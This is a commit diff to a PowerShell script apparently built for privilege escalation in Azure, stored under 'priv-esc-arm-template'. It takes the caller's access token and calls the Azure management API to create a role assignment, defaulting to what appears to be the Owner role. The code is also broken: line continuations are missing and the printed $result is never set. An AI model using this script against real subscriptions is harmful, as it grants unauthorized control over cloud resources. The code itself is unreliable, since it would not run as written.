43379ca3cac324143b868e0de671c03d6522b4c2
Rogier Dijkman <40334679+azurekid@users.noreply.github.com>
2023-07-07 16:16:32 +0200

    Update miaow.ps1

--- priv-esc-arm-template/miaow.ps1
+++ priv-esc-arm-template/miaow.ps1
@@ -10,7 +10,9 @@ param (
     [string]$roleDefinition = '8e3af657-a8ff-443c-a75c-2fe8c4bcb635'
 )
 
+Write-Host "##[debug] Generating Access Token"
 $token = (Get-AzAccessToken).token
+$guid = (New-Guid).Guid
 
 $payload = @{
     properties = @{
@@ -20,19 +22,11 @@ $payload = @{
     }
 }
 
-$guid = (New-Guid).Guid
-
-# $requestParam = @{
-#     uri         = "https://management.azure.com/subscriptions/$($subscriptionId)/providers/Microsoft.Authorization/roleAssignments/$($guid)?api-version=2022-04-01"
-#     headers     = @{"Authorization" = "Bearer $token"}
-#     contenttype = 'application/json'
-#     method      = 'PUT'
-# }
-
 Invoke-RestMethod `
     -uri "https://management.azure.com/subscriptions/$($subscriptionId)/providers/Microsoft.Authorization/roleAssignments/$($guid)?api-version=2022-04-01" `
     -body ($payload | ConvertTo-Json -Depth 10 -Compress)
     -contenttype 'application/json' `
     -method 'PUT'
     -headers @{"Authorization" = "Bearer $token"}
-# write-output $result
+
+write-output $result
